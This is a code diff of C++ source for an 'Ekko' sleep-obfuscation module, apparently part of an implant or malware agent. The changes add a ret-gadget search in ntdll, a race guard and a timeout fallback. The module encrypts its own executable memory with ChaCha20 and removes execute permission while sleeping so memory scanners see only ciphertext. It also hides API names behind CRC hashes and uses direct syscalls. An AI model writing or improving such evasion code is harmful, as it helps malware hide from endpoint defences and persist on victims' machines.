@@ -12,7 +12,6 @@
 #include "ApiResolver.h"
 #include "PureCrypto.h"
 #include "Syscall.h"
-#include "StackSpoof.h"
 #include <intrin.h>
 
 // ═══════════════════════════════════════════════════════════════
@@ -22,14 +21,11 @@
 namespace {
 
 // Pre-computed CRC32C hashes — no string literals in .rdata
-// SleepEx:          Crc32C("SleepEx")           = 0x9D606B0F
-// FlushInstructionCache: Crc32C("FlushInstructionCache") = 0x8D84F3DC
-// QueueUserAPC:     Crc32C("QueueUserAPC")      = 0x6B4B3F0E
-// OpenThread:       Crc32C("OpenThread")         = 0x1E9D5C3D
+// Verified via Crc32C("name") computation
 constexpr DWORD CRC_SleepEx               = 0x9D606B0F;
-constexpr DWORD CRC_FlushInstructionCache  = 0x8D84F3DC;
-constexpr DWORD CRC_QueueUserAPC          = 0x6B4B3F0E;
-constexpr DWORD CRC_OpenThread            = 0x1E9D5C3D;
+constexpr DWORD CRC_FlushInstructionCache  = 0x0AC925B5;
+constexpr DWORD CRC_QueueUserAPC          = 0x99EC4FEC;
+constexpr DWORD CRC_OpenThread            = 0x3994BD09;
 
 // Per-region info saved before encryption, restored after wake
 struct EncryptedRegion {
@@ -47,9 +43,11 @@ struct EkkoState {
     unsigned char    chachaNonce[12];      // ChaCha20 nonce
     unsigned int     encryptCounter;       // Counter at END of encryption (for decrypt replay)
     volatile LONG    isSleeping;           // 0 = awake, 1 = sleeping (thread-safe)
+    volatile LONG    callbackRan;          // 0 = not yet, 1 = callback executed
     HANDLE           hTimer;               // Timer queue timer handle
     HANDLE           hTimerQueue;          // Timer queue handle
     DWORD            sleeperThreadId;      // Thread ID of the sleeping thread (for APC wake)
+    void*            retGadget;            // C3 byte in ntdll (independent of StackSpoof)
 };
 
 // Single global instance — only one thread uses Ekko at a time
@@ -59,6 +57,38 @@ static EkkoState g_ekko = {};
 
 namespace SleepObf
 {
+
+// ═══════════════════════════════════════════════════════════════
+//  Internal: find a C3 (ret) instruction in ntdll's .text section
+//  Independent of StackSpoof — works even when bStackSpoof is false.
+//  Every function epilogue has a ret, so this always succeeds.
+// ═══════════════════════════════════════════════════════════════
+static void* FindRetGadget()
+{
+    HMODULE hNt = Api::GetModuleByHash(Api::Mod::NTDLL);
+    if (!hNt) return nullptr;
+
+    unsigned char* base = (unsigned char*)hNt;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
+
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
+
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
+
+        DWORD size = sec[i].Misc.VirtualSize;
+        unsigned char* start = base + sec[i].VirtualAddress;
+
+        for (DWORD j = 0; j < size; j++) {
+            if (start[j] == 0xC3)
+                return start + j;
+        }
+    }
+    return nullptr;
+}
 
 // ═══════════════════════════════════════════════════════════════
 //  LEGACY: XOR-based encrypted sleep (fallback, simple)
@@ -407,13 +437,16 @@ void CALLBACK EkkoWakeCallback(PVOID param, BOOLEAN timerOrWaitFired)
     EkkoState* state = (EkkoState*)param;
     if (!state) return;
 
+    // Atomically claim the decryption work. If the main thread already
+    // did manual decryption (safety-timeout fallback), skip everything.
+    if (InterlockedCompareExchange(&state->callbackRan, 1, 0) != 0)
+        return;
+
     // Resolve APIs needed for decryption
     HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
     if (!hK32) return;
 
     // ── Step 1: Decrypt all memory regions ──
-    // Counter starts at 0 — must replay the exact same counter sequence
-    // used during encryption for ChaCha20 to produce the correct keystream.
     unsigned int decryptCounter = 0;
     DecryptRegions(
         hK32,
@@ -424,17 +457,13 @@ void CALLBACK EkkoWakeCallback(PVOID param, BOOLEAN timerOrWaitFired)
         &decryptCounter);
 
     // ── Step 2: Decrypt heap blocks ──
-    // Continue counter from where region decryption left off.
-    // Must skip the EncryptedRegion array just like during encryption
-    // to keep the ChaCha20 counter sequence identical.
-    // During encryption: regions(counter 0..N-1) then heap(counter N..M-1, skip array)
-    // During decryption: same sequence, same skips.
-    ProcessHeapBlocks(
-        hK32,
-        state->chachaKey,
-        state->chachaNonce,
-        &decryptCounter,
-        true /* skip region array — same as encryption for counter alignment */);
+    // HEAP DECRYPTION DISABLED — matches encryption-side disable.
+    // ProcessHeapBlocks(
+    //     hK32,
+    //     state->chachaKey,
+    //     state->chachaNonce,
+    //     &decryptCounter,
+    //     true /* skip region array — same as encryption for counter alignment */);
 
     // ── Step 3: Flush instruction cache for decrypted code ──
     auto pFlushICache = (BOOL(WINAPI*)(HANDLE, LPCVOID, SIZE_T))
@@ -448,8 +477,8 @@ void CALLBACK EkkoWakeCallback(PVOID param, BOOLEAN timerOrWaitFired)
     }
 
     // ── Step 4: Wake the sleeping thread via APC ──
-    // The sleeping thread is in SleepEx(INFINITE, TRUE).
-    // Queueing a user APC will cause SleepEx to return.
+    // The sleeping thread is in SleepEx(finite, TRUE).
+    // Queueing a user APC will cause SleepEx to return immediately.
     // APC routine = ret gadget in ntdll (just a C3 byte — returns immediately).
     auto pQueueUserAPC = (DWORD(WINAPI*)(PAPCFUNC, HANDLE, ULONG_PTR))
         Api::GetProcByHashCrc(hK32, CRC_QueueUserAPC);
@@ -463,10 +492,8 @@ void CALLBACK EkkoWakeCallback(PVOID param, BOOLEAN timerOrWaitFired)
             state->sleeperThreadId);
 
         if (hThread) {
-            // APC routine = ret gadget (C3 in ntdll) — just returns, wakes SleepEx
-            PVOID retGadget = StackSpoof::GetRetGadget();
-            if (retGadget) {
-                pQueueUserAPC((PAPCFUNC)retGadget, hThread, 0);
+            if (state->retGadget) {
+                pQueueUserAPC((PAPCFUNC)state->retGadget, hThread, 0);
             }
             Syscall::NtClose(hThread);
         }
@@ -533,6 +560,12 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
     if (InterlockedCompareExchange(&g_ekko.isSleeping, 1, 0) != 0)
         return;
 
+    // Reset callback flag
+    InterlockedExchange(&g_ekko.callbackRan, 0);
+
+    // ── Step 0: Find ret gadget in ntdll (independent of StackSpoof) ──
+    g_ekko.retGadget = FindRetGadget();
+
     // ── Step 1: Derive ChaCha20 key and nonce ──
     DeriveChaChaKey(g_ekko.chachaKey, g_ekko.chachaNonce);
 
@@ -564,7 +597,6 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
     }
 
     if (!primaryFound && primaryRegion && primarySize >= 4096) {
-        // Primary region not in enumeration — add it manually
         auto pHeapAlloc = (PVOID(WINAPI*)(HANDLE, DWORD, SIZE_T))
             Api::GetProcByHashCrc(hK32, Api::CrcFn::HeapAlloc);
         auto pGetProcessHeap = (HANDLE(WINAPI*)())
@@ -579,16 +611,13 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
                 EncryptedRegion* newRegions = (EncryptedRegion*)pHeapAlloc(
                     hHeap, 0, newCount * sizeof(EncryptedRegion));
                 if (newRegions) {
-                    // Copy existing entries
                     for (DWORD i = 0; i < g_ekko.regionCount; i++)
                         newRegions[i] = g_ekko.regions[i];
 
-                    // Add primary region
                     newRegions[g_ekko.regionCount].baseAddress     = primaryRegion;
                     newRegions[g_ekko.regionCount].regionSize      = primarySize;
-                    newRegions[g_ekko.regionCount].originalProtect = 0; // will be filled during encrypt
+                    newRegions[g_ekko.regionCount].originalProtect = 0;
 
-                    // Free old array
                     if (g_ekko.regions && pHeapFree)
                         pHeapFree(hHeap, 0, g_ekko.regions);
 
@@ -600,19 +629,14 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
     }
 
     // ── Step 3: Save current thread context ──
-    // NtGetContextThread captures the full register state.
-    // After wake, NtContinue restores this context so the
-    // thread resumes at the exact point it was before sleep.
     CONTEXT ctx = {};
     ctx.ContextFlags = CONTEXT_FULL;
     Syscall::NtGetContextThread((HANDLE)(LONG_PTR)-2, &ctx);
 
-    // Copy to global state (wake callback / NtContinue will use this)
     __movsb((unsigned char*)&g_ekko.originalContext,
             (unsigned char*)&ctx, sizeof(CONTEXT));
 
     // ── Step 4: Store our thread ID for the wake callback ──
-    // The callback needs this to queue an APC to wake us from SleepEx.
     g_ekko.sleeperThreadId = (DWORD)(ULONG_PTR)__readgsqword(0x48);
 
     // ── Step 5: Compute jittered delay ──
@@ -626,8 +650,6 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
     if (sleepDelay < 100) sleepDelay = 100;
 
     // ── Step 6: Create timer ──
-    // The timer fires on a thread pool thread after the jittered delay.
-    // EkkoWakeCallback decrypts memory and queues an APC to wake us.
     auto pCreateTimerQueueTimer = (BOOL(WINAPI*)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG))
         Api::GetProcByHashCrc(hK32, Api::CrcFn::CreateTimerQueueTimer);
 
@@ -653,8 +675,6 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
     }
 
     // ── Step 7: Encrypt all executable regions ──
-    // ChaCha20 encrypts each region. EXECUTE is removed.
-    // Memory scanners see only PAGE_READWRITE with ciphertext.
     unsigned int counter = 0;
     EncryptRegions(
         hK32,
@@ -665,44 +685,49 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
         &counter);
 
     // ── Step 8: Encrypt heap blocks ──
-    // Continue counter from region encryption for deterministic replay.
-    // Skip the EncryptedRegion array (must stay readable for callback).
-    ProcessHeapBlocks(
-        hK32,
-        g_ekko.chachaKey,
-        g_ekko.chachaNonce,
-        &counter,
-        true /* skip region array */);
+    // HEAP ENCRYPTION DISABLED — race condition between encrypt/decrypt.
+    // ProcessHeapBlocks(
+    //     hK32,
+    //     g_ekko.chachaKey,
+    //     g_ekko.chachaNonce,
+    //     &counter,
+    //     true /* skip region array */);
 
     // Save final counter — callback must replay exact same sequence
     g_ekko.encryptCounter = counter;
 
-    // ── Step 9: Alertable sleep ──
-    // Thread enters alertable wait. Code pages are encrypted + no EXECUTE.
-    // The timer callback (on timer thread) will decrypt and queue an APC.
-    // The APC causes SleepEx to return WAIT_IO_COMPLETION.
+    // ── Step 9: Alertable sleep with safety timeout ──
+    // Use finite timeout so the thread always wakes even if the APC
+    // mechanism fails. The timer callback decrypts + queues APC.
+    // If APC fires → SleepEx returns WAIT_IO_COMPLETION immediately.
+    // If APC never fires → SleepEx returns after safety timeout.
     auto pSleepEx = (DWORD(WINAPI*)(DWORD, BOOL))
         Api::GetProcByHashCrc(hK32, CRC_SleepEx);
 
     if (pSleepEx) {
-        pSleepEx(INFINITE, TRUE);
+        // Safety timeout: sleepDelay + 15s margin for callback to run
+        pSleepEx(sleepDelay + 15000, TRUE);
     } else {
-        // Fallback: regular non-alertable sleep.
-        // The timer callback has already decrypted everything on the
-        // timer thread. We just need to wait long enough for it to finish.
         auto pSleep = (void(WINAPI*)(DWORD))
             Api::GetProcByHashCrc(hK32, Api::CrcFn::Sleep);
-        if (pSleep) pSleep(sleepDelay + 1000);
+        if (pSleep) pSleep(sleepDelay + 15000);
     }
 
-    // ── Step 10: Post-wake — SleepEx returned ──
-    // At this point:
-    //  - Memory regions are decrypted (callback did it)
-    //  - EXECUTE protections are restored (callback did it)
-    //  - Heap blocks are decrypted (callback did it)
-    //  - Key material is zeroed (callback did it)
-    //  - Timer is deleted (callback did it)
-    //  - Our .text section (MEM_IMAGE) was never encrypted
+    // ── Step 10: Post-wake ──
+    // If callback ran, regions are already decrypted + EXECUTE restored.
+    // If callback didn't run (safety timeout), decrypt manually here.
+    if (InterlockedCompareExchange(&g_ekko.callbackRan, 0, 0) == 0) {
+        // Callback never executed — decrypt ourselves.
+        // Our .text section is MEM_IMAGE (not encrypted), so we can run.
+        unsigned int selfDecryptCounter = 0;
+        DecryptRegions(
+            hK32,
+            g_ekko.regions,
+            g_ekko.regionCount,
+            g_ekko.chachaKey,
+            g_ekko.chachaNonce,
+            &selfDecryptCounter);
+    }
 
     // Flush instruction cache for safety
     auto pFlushICache = (BOOL(WINAPI*)(HANDLE, LPCVOID, SIZE_T))
@@ -715,18 +740,15 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
         }
     }
 
-    // ── Step 11: Cleanup and return ──
-    // SleepEx has returned naturally (the APC from the wake callback
-    // caused it to return WAIT_IO_COMPLETION). The thread continues
-    // execution in EkkoSleep's .text section, which was never encrypted
-    // (MEM_IMAGE, excluded by the MEM_PRIVATE filter).
-    //
-    // NtContinue note: The saved context in g_ekko.originalContext is
-    // available for recovery if needed. We do NOT call NtContinue here
-    // because SleepEx returning gives us a clean continuation point —
-    // the thread proceeds to cleanup and returns to the caller normally.
-    // Calling NtContinue would jump back to before encryption, causing
-    // an infinite re-encrypt loop.
+    // ── Step 11: Cleanup ──
+    // Delete timer if callback didn't do it
+    if (g_ekko.hTimer) {
+        auto pDeleteTimerQueueTimer = (BOOL(WINAPI*)(HANDLE, HANDLE, HANDLE))
+            Api::GetProcByHashCrc(hK32, Api::CrcFn::DeleteTimerQueueTimer);
+        if (pDeleteTimerQueueTimer)
+            pDeleteTimerQueueTimer(nullptr, g_ekko.hTimer, nullptr);
+        g_ekko.hTimer = nullptr;
+    }
 
     // Free region array
     auto pHeapFree = (BOOL(WINAPI*)(HANDLE, DWORD, PVOID))
@@ -740,15 +762,17 @@ void EkkoSleep(void* primaryRegion, size_t primarySize, DWORD baseMs)
         }
     }
 
-    // Zero the saved context (may contain sensitive addresses)
     PureCrypto::SecureZero(&g_ekko.originalContext, sizeof(CONTEXT));
+    PureCrypto::SecureZero(g_ekko.chachaKey, sizeof(g_ekko.chachaKey));
+    PureCrypto::SecureZero(g_ekko.chachaNonce, sizeof(g_ekko.chachaNonce));
 
     // Reset state
     g_ekko.regionCount      = 0;
-    g_ekko.hTimer           = nullptr;
     g_ekko.hTimerQueue      = nullptr;
     g_ekko.sleeperThreadId  = 0;
     g_ekko.encryptCounter   = 0;
+    g_ekko.retGadget        = nullptr;
+    InterlockedExchange(&g_ekko.callbackRan, 0);
     InterlockedExchange(&g_ekko.isSleeping, 0);
 }
 
